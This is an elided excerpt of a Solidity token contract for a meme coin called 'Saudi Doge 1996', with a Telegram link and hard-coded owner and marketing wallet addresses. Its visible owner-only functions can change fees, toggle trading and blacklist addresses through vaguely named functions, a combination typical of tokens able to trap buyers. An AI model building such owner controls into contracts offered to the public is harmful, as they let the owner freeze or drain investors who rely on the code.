...
// telegram : https://t.me/SaudiDoge1996
...
contract SaudiDoge1996 is Context, IERC20 { 
    ...
    address payable private Wallet_Marketing = payable(0xFA9342e908B82dF3EdB2737cD318062d4d6f423c); 
    address payable private Wallet_Dev = payable(0x811CACaE93eC1B7Ff4a0CA77e345105F0fB0b9Bd);
    ...
    string private constant _name = "Saudi Doge 1996"; 
    string private constant _symbol = unicode"SDoge1996"; 
    ...
    uint256 public _Tax_On_Sell = 9;
     function _fixTAX(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {
    ...
    constructor () {
        ...
        _owner = 0x811CACaE93eC1B7Ff4a0CA77e345105F0fB0b9Bd;
    ...
    function OPTrading(bool open) external onlyOwner {
        _open = open;
    }
    ...
    */
    ...
    function BLALA(address[] calldata addresses) external onlyOwner {
    ...
    function BLA(address addresses) external onlyOwner {
    ...
    function Minimum_purchase(uint256 maxTxPercent_x100) external onlyOwner() {
        _maxTxAmount = _tTotal*maxTxPercent_x100/10000;
    }    
    
    // Set the maximum wallet holding (percent of total supply)
     function Wallet_max(uint256 maxWallPercent_x100) external onlyOwner() {
